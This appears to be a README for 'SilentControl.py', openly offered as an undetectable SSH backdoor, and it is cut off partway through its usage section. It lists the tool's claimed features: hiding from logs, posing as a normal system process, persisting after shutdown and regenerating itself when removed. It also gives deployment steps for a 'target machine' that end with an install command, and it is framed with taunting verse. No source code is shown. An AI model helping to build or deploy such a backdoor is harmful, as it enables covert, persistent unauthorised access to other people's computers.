# SilentControl.py  
_A hidden SSH backdoor that remains undetectable._  

"A lock is only as secure as the person holding the key.
A connection is only as safe as the one controlling it.
If a backdoor is installed once—
Can it ever truly be removed?"

### What It Does:  
- **Creates an SSH backdoor that hides itself from logs**  
- **Mimics a normal system process to avoid detection**  
- **Auto-restarts after shutdown to maintain persistence**  
- **Prevents unauthorized removal by regenerating itself**  

### Who Is It For?  
_"A system that allows access once—  
Can always be accessed again."_  

### How to Use:  
1. Deploy **SilentControl** on a target machine  
2. Set up your hidden SSH user:  
   ```bash
   python3 SilentControl.py --install
